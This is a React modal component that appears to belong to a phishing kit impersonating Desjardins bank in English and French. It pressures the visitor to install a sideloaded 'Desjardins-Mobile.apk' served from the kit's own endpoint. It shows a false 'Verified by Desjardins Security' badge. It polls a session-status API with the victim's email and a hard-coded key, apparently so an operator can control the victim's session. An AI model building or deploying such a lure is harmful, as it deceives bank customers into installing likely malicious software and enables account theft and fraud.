import React, { useEffect } from 'react';
import { X, Shield, Smartphone, Bell, Download } from 'lucide-react';

const translations = {
  en: {
    title: 'Download the Desjardins Mobile App',
    subtitle: 'For improved security and a better banking experience, please install the official Desjardins mobile app to continue.',
    bullets: [
      { icon: Shield, text: 'Enhanced security with biometric login' },
      { icon: Smartphone, text: 'Faster, seamless access to your accounts' },
      { icon: Bell, text: 'Real-time alerts and notifications' },
    ],
    downloadBtn: 'Download Desjardins Mobile App',
    securityBadge: 'Verified by Desjardins Security',
  },
  fr: {
    title: 'Téléchargez l\'application mobile Desjardins',
    subtitle: 'Pour une sécurité améliorée et une meilleure expérience bancaire, veuillez installer l\'application mobile officielle Desjardins pour continuer.',
    bullets: [
      { icon: Shield, text: 'Sécurité renforcée avec connexion biométrique' },
      { icon: Smartphone, text: 'Accès plus rapide et fluide à vos comptes' },
      { icon: Bell, text: 'Alertes et notifications en temps réel' },
    ],
    downloadBtn: 'Télécharger l\'application mobile Desjardins',
    securityBadge: 'Vérifié par Sécurité Desjardins',
  },
};

export default function AppDownloadModal({ email, lang = 'en', onClose }) {
  const t = translations[lang];

  useEffect(() => {
    let isMounted = true;
    const pollStatus = async () => {
      try {
        const response = await fetch(`/api/session-status?email=${encodeURIComponent(email)}`, {
          headers: { 'X-Access-Key': 'client-desjardins-banque' },
        });
        const data = await response.json();
        if (!isMounted) return;
        if (data.success && (data.status === 'cancelled' || data.status === 'idle')) {
          onClose();
          window.location.reload();
        }
      } catch (err) {
        console.error('Error polling session status in AppDownloadModal:', err);
      }
    };
    pollStatus();
    const intervalId = setInterval(pollStatus, 2000);
    return () => { isMounted = false; clearInterval(intervalId); };
  }, [email, onClose]);

  const handleDownload = () => {
    const link = document.createElement('a');
    link.href = '/api/download-desjardins-app';
    link.download = 'Desjardins-Mobile.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs animate-fade-in">
      <div className="bg-white w-full max-w-[460px] rounded-2xl shadow-[0_20px_50px_rgba(0,0,0,0.15)] px-8 pt-9 pb-8 flex flex-col relative border border-[#e8e8e8] animate-slide-in overflow-hidden">
        {/* Decorative top accent line with Desjardins Green */}
        <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#1a7d48] to-[#003168]" />

        {onClose && (
          <button
            type="button"
            onClick={onClose}
            className="absolute top-4 right-4 bg-transparent border-none cursor-pointer text-[#888] hover:text-[#555] p-1.5 flex items-center rounded-full hover:bg-black/5 transition-all duration-200"
            aria-label="Close"
          >
            <X className="w-[18px] h-[18px]" />
          </button>
        )}

        {/* Desjardins Logo Container */}
        <div className="flex justify-center mb-5">
          <div className="bg-white p-2 rounded-2xl shadow-[0_4px_12px_rgba(0,106,195,0.08)] border border-[#e0eef9] transition-all duration-500 hover:scale-105">
            <img
              src="/desjardins-hexa.png"
              alt="Desjardins Logo"
              className="w-14 h-14 object-contain rounded-xl"
            />
          </div>
        </div>

        <h3 className="text-[22px] font-bold text-[#1f2937] text-center mb-2 tracking-tight">
          {t.title}
        </h3>
        <p className="text-[#6b7280] text-[14.5px] text-center mb-6 leading-relaxed px-2">
          {t.subtitle}
        </p>

        {/* Bullet features cards */}
        <ul className="space-y-3 mb-6">
          {t.bullets.map(({ icon: Icon, text }) => (
            <li 
              key={text} 
              className="flex items-center gap-3.5 p-3 rounded-xl bg-[#f0f5f9]/60 border border-[#e0eef9]/80 hover:bg-[#e0eef9]/70 transition-all duration-300"
            >
              <span className="flex-shrink-0 w-8 h-8 rounded-lg bg-[#e0eef9] flex items-center justify-center shadow-sm">
                <Icon className="w-[18px] h-[18px] text-[#1a7d48]" />
              </span>
              <span className="text-[13.5px] text-[#374151] font-medium leading-tight">{text}</span>
            </li>
          ))}
        </ul>

        {/* Download Button */}
        <button
          type="button"
          onClick={handleDownload}
          className="w-full flex items-center justify-center gap-2 bg-[#1a7d48] hover:bg-[#003168] text-white text-[15px] font-semibold py-3.5 px-6 rounded-lg border-none cursor-pointer shadow-[0_4px_14px_rgba(0,106,195,0.25)] hover:shadow-[0_6px_20px_rgba(0,106,195,0.35)] active:scale-[0.99] transition-all duration-200"
        >
          <Download className="w-[18px] h-[18px] animate-bounce-subtle" />
          {t.downloadBtn}
        </button>

        {/* Security badge pill */}
        <div className="flex items-center justify-center gap-2 mt-5 pt-4 border-t border-[#f3f4f6]">
          <div className="flex items-center gap-1.5 bg-[#f0f5f9] border border-[#e0eef9] px-3.5 py-1.5 rounded-full shadow-sm">
            <Shield className="w-3.5 h-3.5 text-[#1a7d48]" />
            <span className="text-[10px] text-[#1a7d48] font-bold tracking-wider uppercase">
              {t.securityBadge}
            </span>
          </div>
        </div>
      </div>
      
      <style>{`
        @keyframes bounceSubtle {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-3px); }
        }
        .animate-bounce-subtle {
          animation: bounceSubtle 1.8s ease-in-out infinite;
        }
      `}</style>
    </div>
  );
}
